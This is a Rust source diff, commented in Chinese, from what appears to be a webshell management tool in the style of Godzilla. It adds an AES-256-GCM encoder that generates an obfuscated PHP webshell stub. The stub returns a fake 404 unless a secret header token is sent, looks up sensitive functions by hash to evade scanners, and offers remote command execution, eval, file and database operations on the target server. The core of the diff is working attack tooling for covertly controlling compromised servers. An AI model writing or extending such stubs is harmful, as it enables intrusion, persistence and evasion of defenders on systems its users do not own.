@@ -394,6 +394,164 @@ pub trait PayloadEncoder: Send + Sync {
 }
 
 /// 编码器注册表。
+/// AEAD 编码器：HKDF-SHA256 派生 + AES-256-GCM + 防重放。
+///
+/// 与其它编码器的关键差别：**加解密需要会话级状态**（发送序号 + 接收滑动窗口），
+/// 因此协议层不直接调用 trait 的 `encode`/`decode`，而是用
+/// `aead::AeadSession`（见 `PhpSession.aead`）。这里的 `encode`/`decode`
+/// 仅提供无状态的一次性封装，供测试或单次工具使用。
+pub struct AeadEncoder;
+
+/// PHP stub：NATIVE 骨架 + AEAD 加解密。
+///
+/// 依赖：PHP 7.1+（`hash_hkdf`）、openssl 扩展（`openssl_encrypt('aes-256-gcm')`）、
+/// 64 位 PHP（响应序号用 `pack('J')`）。
+pub fn aead_php_stub(password: &str) -> String {
+    let prefix = format!("_{}_", php_ident());
+    let xk = alpha_ident();
+    let key = crate::aead::derive_key(password);
+    let token = crate::aead::token_hex(&key);
+    let ikm_hex = crate::aead::ikm_hex(password);
+    let h = |op: &str| -> String {
+        let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
+        let mut n: u64 = 0;
+        for (i, c) in digest.chars().take(8).enumerate() {
+            n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
+        }
+        n.to_string()
+    };
+    // 解密 + 防重放。nonce 前 8 字节是**连接标识 sid**（客户端每连接随机一次），
+    // 重放窗口状态按 sid 分文件存放，因此：
+    //   - 重连（新 sid）不会继承上一连接的窗口 —— 否则客户端序号从 1 重来会被
+    //     判成重放，会话永久不可用（修复前实测如此，只能删目标机状态文件才恢复）
+    //   - 并发连接互不干扰，各自的重放窗口都成立
+    //   - 跨连接重放一条抓到的旧帧，只要对应 sid 的状态文件还在，仍会被拒
+    // 状态文件在目标机临时目录，体积约 20 字节；由系统临时目录清理机制回收。
+    let decrypt = "$__n=substr($in,0,12);$__s=substr($in,12,8);$__t=substr($in,-16);\
+        $__c=substr($in,20,-16);\
+        $__k=@$_g[18]('sha256',pack('H*',$K),32,'dsw2','dosword/aead/v2');\
+        $raw=@$_g[16]($__c,'aes-256-gcm',$__k,OPENSSL_RAW_DATA,$__n,$__t,'dsw2'.chr(1).$__s);\
+        if($raw===false){$raw='';}else{\
+        $__sq=unpack('J',$__s)[1];\
+        $__sf=@sys_get_temp_dir().'/.dsw_a_'.substr(md5($K),0,8).'_'.bin2hex(substr($__n,0,8));\
+        $__last=@$_g[3]($__sf);\
+        if($__last!==false&&$__sq<=(int)$__last){$raw='';}\
+        else{@$_g[4]($__sf,(string)$__sq);}}";
+    // 响应 nonce 用 CSPRNG（random_bytes，被禁时降级）；GCM 下 nonce 复用会泄漏明文异或
+    let encrypt = "$__n2=function_exists('random_bytes')?@$_g[19](12):substr(md5(uniqid('',true),true),0,12);\
+        $__s2=pack('J',function_exists('hrtime')?@hrtime(true):(int)(microtime(true)*1000000000));\
+        $__tag='';\
+        $__c2=@$_g[17]($out,'aes-256-gcm',$__k,OPENSSL_RAW_DATA,$__n2,$__tag,'dsw2'.chr(2).$__s2);\
+        $enc=base64_encode($__n2.$__s2.$__c2.$__tag);";
+
+    let mut symbols = vec![
+        ("920cfbfd", 0),
+        ("9ff5d542", 1),
+        ("237937f6", 2),
+        ("2693a743", 3),
+        ("f0e567fb", 4),
+        ("f4cd15f3", 5),
+        ("f6cfd9d8", 6),
+        ("95e8b309", 7),
+        ("3d891bcd", 8),
+        ("dbc7b210", 9),
+        ("c996c86e", 10),
+        ("d99d544e", 11),
+        ("0e4d97e1", 12),
+        ("718c6ebe", 13),
+        ("4a41c8d9", 14),
+        ("c3427e9c", 15),
+        // openssl_decrypt / openssl_encrypt / hash_hkdf / random_bytes
+        // （表里存的是函数名的 crc32b，stub 用 hash('crc32b',$name) 反查）
+        ("ae4975ad", 16),
+        ("62f98eda", 17),
+        ("81c7194f", 18),
+        ("8596e554", 19),
+    ];
+    symbols.sort_by_key(|(_, index)| *index);
+    let mut table = String::new();
+    for (hash, index) in symbols {
+        table.push_str(&format!("    '{hash}' => {index},\n"));
+    }
+
+    NATIVE_STUB_TPL
+        .replace("__DEC__", &format!("{prefix}dec"))
+        .replace("__XOR__", &format!("{prefix}xor"))
+        .replace("__XK__", &xk)
+        .replace("__GKHEX__", &xor_hex("HTTP_X_DEBUG_KEY", &xk))
+        .replace("__TOKENHEX__", &xor_hex(&token, &xk))
+        .replace("__KEYHEX__", &xor_hex(&ikm_hex, &xk))
+        .replace("__CMD__", &format!("{prefix}cmd"))
+        .replace("__SCAN__", &format!("{prefix}scan"))
+        .replace("__FETCH__", &format!("{prefix}fetch"))
+        .replace("__STORE__", &format!("{prefix}store"))
+        .replace("__DROP__", &format!("{prefix}drop"))
+        .replace("__MOVE__", &format!("{prefix}move"))
+        .replace("__MKDIR__", &format!("{prefix}mkdir"))
+        .replace("__ENV__", &format!("{prefix}env"))
+        .replace("__DBP__", &format!("{prefix}dbp"))
+        .replace("__DBQ__", &format!("{prefix}dbq"))
+        .replace("__EVALFN__", &format!("{prefix}eval_fn"))
+        .replace("__H_PROBE__", &h("probe"))
+        .replace("__H_EVAL__", &h("eval"))
+        .replace("__H_EXEC__", &h("exec"))
+        .replace("__H_LIST__", &h("list"))
+        .replace("__H_READ__", &h("read"))
+        .replace("__H_WRITE__", &h("write"))
+        .replace("__H_DELETE__", &h("delete"))
+        .replace("__H_RENAME__", &h("rename"))
+        .replace("__H_MKDIR__", &h("mkdir"))
+        .replace("__H_TOUCH__", &h("touch"))
+        .replace("__H_DBPROBE__", &h("dbprobe"))
+        .replace("__H_DBQUERY__", &h("dbquery"))
+        .replace("__SYMBOLS__", &table)
+        .replace("__ALGO__", "")
+        .replace("__DECRYPT__", decrypt)
+        .replace("__ENCRYPT__", encrypt)
+}
+
+impl PayloadEncoder for AeadEncoder {
+    fn id(&self) -> &'static str {
+        "native_aead"
+    }
+
+    fn display_name(&self) -> &'static str {
+        "NATIVE_AEAD（HKDF-SHA256 + AES-256-GCM + 防重放）"
+    }
+
+    fn derive_key(&self, password: &str) -> String {
+        crate::aead::derive_key(password)
+            .iter()
+            .map(|b| format!("{b:02x}"))
+            .collect()
+    }
+
+    /// 无状态一次性封装：seq 固定为 1、nonce 随机。
+    /// stub 按 nonce 前缀的 sid 隔离重放窗口，随机 sid 会被当成新连接（窗口重置），
+    /// 因此重复调用不会互相拒绝，但**连接内防重放也随之失效** ——
+    /// 协议层请用 `AeadSession`（sid 固定、seq 递增）。
+    fn encode(&self, code: &str, password: &str) -> String {
+        let key = crate::aead::derive_key(password);
+        crate::aead::seal(&key, crate::aead::DIR_REQUEST, 1, code.as_bytes()).unwrap_or_default()
+    }
+
+    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
+        let key = crate::aead::derive_key(password);
+        crate::aead::open(&key, crate::aead::DIR_RESPONSE, payload)
+            .map(|(_, plaintext)| plaintext)
+            .map_err(ProtocolError::ParseError)
+    }
+
+    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => Ok(aead_php_stub(password)),
+            other => Err(ProtocolError::NotSupported(format!(
+                "AEAD 暂仅支持 PHP（{other} 待实现）"
+            ))),
+        }
+    }
+}
+
 pub struct EncoderRegistry {
     encoders: Vec<Box<dyn PayloadEncoder>>,
 }
@@ -428,6 +586,7 @@ impl EncoderRegistry {
                 // 哥斯拉式分阶段载荷：客户端通道与 session_mode_for 均已实现，
                 // 注册后这条路径才真正可达。
                 Box::new(XorSessionEncoder),
+                Box::new(AeadEncoder),
             ],
         }
     }
@@ -1687,7 +1846,7 @@ $_gk=__DEC__('__GKHEX__','__XK__');
 if(!isset($_SERVER[$_gk])||$_SERVER[$_gk]!==__DEC__('__TOKENHEX__','__XK__')){@header('HTTP/1.1 404 Not Found');exit;}
 
 /* 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表） */
-$_g=array_fill(0,18,'');
+$_g=array_fill(0,20,'');
 $_t=array(
 __SYMBOLS__);
 $_fn=get_defined_functions();
@@ -2551,6 +2710,19 @@ mod tests {
     /// 能力协商依赖 stub 上报 ProtoVersion/Capabilities/ShellType。
     /// PHP 早已上报；本测试防止非 PHP stub 回退。
     #[test]
+    fn aead_stub_has_crypto_primitives_without_plaintext_password() {
+        let stub = AeadEncoder.stub("php", "secret").unwrap();
+        assert!(stub.contains("aes-256-gcm"), "应使用 AES-256-GCM");
+        assert!(stub.contains("81c7194f"), "符号表应含 hash_hkdf 的 crc32b");
+        assert!(stub.contains("ae4975ad"), "符号表应含 openssl_decrypt");
+        assert!(!stub.contains("secret"), "stub 不应含明文密码");
+        assert!(!stub.contains("md5($token)"), "不应退回旧 XOR 模板");
+        // 密钥派生只用 SHA256(password) 的十六进制形式
+        let ikm = crate::aead::ikm_hex("secret");
+        assert!(!stub.contains(&ikm), "IKM 应以 XOR 形式嵌入，不能明文");
+    }
+
+    #[test]
     fn all_language_stubs_report_capabilities() {
         let encoder = NativeEncoder { crypto: "xor" };
         for language in ["php", "jsp", "aspx", "asp", "python", "node"] {
@@ -2584,6 +2756,7 @@ mod tests {
                 "custom",
                 "des",
                 "native",
+                "native_aead",
                 "native_aes_cbc",
                 "native_aes_ecb",
                 "native_chacha20",
@@ -2595,9 +2768,9 @@ mod tests {
                 "xor_body",
                 "xor_session",
             ],
-            "注册表应暴露全部 15 个编码器（NATIVE 系列 + 经典形态 + 自定义）"
+            "注册表应暴露全部 16 个编码器（NATIVE 系列 + 经典形态 + 自定义）"
         );
-        assert_eq!(ids.len(), 15, "编码器数量应与注册表一致");
+        assert_eq!(ids.len(), 16, "编码器数量应与注册表一致");
     }
 
     // --- PHP_STREAM：零敏感函数 stub ---
